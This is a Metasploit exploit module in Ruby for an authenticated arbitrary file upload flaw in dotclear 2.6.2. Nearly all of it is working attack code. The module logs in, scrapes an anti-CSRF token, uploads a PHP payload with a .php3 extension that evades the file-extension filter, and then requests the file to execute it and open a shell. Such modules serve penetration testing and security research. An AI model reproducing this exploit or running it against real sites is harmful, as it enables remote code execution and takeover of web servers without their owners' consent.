##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'dotclear Media Manager Authenticated Arbitrary File Upload',
      'Description'    => %q{
      The vulnerability exists because of the filemanager::isFileExclude() method not properly verifying the extension of
      uploaded files. This method just checks whether the uploaded file name matches the .exclude_pattern. regular expression,
      which by default is set to ./\.php$/i.. This could be exploited to execute arbitrary PHP code by uploading a file with
      multiple extensions or other extensions (like .php5 or .phtml) which might be handled as PHP scripts. Successful
      exploitation of this vulnerability requires an account with permissions to manage media items.
      },
      'Author'         =>
        [
          'Egidio Romano' #discovery
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'http://seclists.org/fulldisclosure/2014/May/108']
        ],
      'Payload'            =>
        {
          'Space' => 10000, # just a big enough number to fit any PHP payload
          'DisableNops' => true
        },
      'Platform'       => 'php',
      'Arch'         => ARCH_PHP,
      'Targets'        =>
        [
          [ 'dotclear 2.6.2', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'May 21 2014'))

    register_options([
      OptString.new('USERNAME', [true, 'The username to authenticate with', 'username']),
      OptString.new('PASSWORD', [true, 'The password to authenticate with', 'password']),
      OptString.new('TARGETURI', [true, 'The full URI path to the instance', '/']),
    ], self.class)
  end

  def check
  end

  def exploit
    post = {
      'user_id' => datastore['USERNAME'],
      'user_pwd' => datastore['PASSWORD']
    }

    print_status("Authenticating...")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'admin', 'auth.php'),
      'method' => 'POST',
      'vars_post' => post
    })


    if !res or !res.body
      fail_with("Server did not respond in an expected way")
    end

    cookie = res.headers['Set-Cookie']

    print_status("Getting xd_check...")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'admin', 'media.php?popup=1'),
      'cookie' => cookie
    })

    if !res or !res.body
      fail_with("Server did not respond in an expected way")
    end

    res.body =~ /name="xd_check" value="(.*)"  \/><input type="hidden" name="d"/

    xd_check = $1

    data = Rex::MIME::Message.new
    filename = Rex::Text::rand_text_alpha(8)

    data.add_part('2097152', nil, nil, 'form-data; name="MAX_FILE_SIZE"')
    data.add_part(xd_check, nil, nil, 'form-data; name="xd_check"')
    data.add_part('', nil, nil, 'form-data; name="upfiletitle"')
    data.add_part('', nil, nil, 'form-data; name="d"')
    data.add_part('<?php ' + payload.encoded + ' ?>', nil, 'text/php', 'form-data; name="upfile[]"; filename="' + filename + '.php3')

    print_status("Sending payload...")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'admin', 'media.php?pop_up=1&post_id='),
      'method' => 'POST',
      'cookie' => cookie,
      'data' => data.to_s,
      'ctype' => 'multipart/form-data; boundary=' + data.bound
    })

    if !res or !res.body
      fail_with("Server did not respond in an expected way")
    end

    #do something with res

    print_status("Popping shell...")
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'public', filename + '.php3')
    })
  end
end